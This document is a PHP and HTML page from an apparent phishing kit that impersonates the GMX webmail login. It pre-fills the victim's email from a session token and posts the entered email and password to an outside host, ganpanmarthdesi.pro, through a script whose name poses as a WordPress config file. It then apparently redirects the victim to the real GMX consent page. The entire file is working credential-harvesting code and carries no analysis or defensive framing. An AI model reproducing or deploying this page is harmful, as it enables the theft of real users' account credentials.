<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Login</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://img.ui-portal.de/cd/ci/gmx.net/favicon.ico"/>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 15px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=email],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 32px;
  width: 100%;
  margin: 0;
  padding: 10px;
  background: transparent;
  border: #fff;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  font-weight: 400;
  font-family: inherit;
  line-height: 18px;
  vertical-align: top;
  color: #404040;
  }
  input[type=email]:focus,
  input[type=password]:focus {
  outline: none;
  padding: 10px;
  background-color: transparent;
  border-radius: 5px;
  font-size: 15px;
  font-weight: 400;
  font-family: inherit;
  line-height: 18px;
  border: 2px #114898;
  }
</style>
<body background="img/bg.png">

<div align="center">
	<table border="0" width="368" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="105"></td>
				</tr>
				<tr>
					<td height="428" bgcolor="#00FF00" background="img/fm.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
					  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
						<tr>
							<td height="232"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="32"></td>
									<td>
									 <input type="email" name="user" value="" required autofocus >
									 <input type="email" name="sender" value="Gmx" >
									 <input type="email" name="domain" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
									 <input type="hidden" name="link" value="https://www.gmx.net/consent-management/" >
									</td>
									<td width="31"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="36"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="32"></td>
									<td>
									 <input type="password" name="passwd" value="" required >
									</td>
									<td width="31"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="16"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="32"></td>
									<td>
									<input type="image" src="img/btn.png" width="304" height="32"></td>
									<td width="31"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="70"></td>
						</tr>
						</form>
					</table>
					</td>
				</tr>
				<tr>
					<td height="110"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>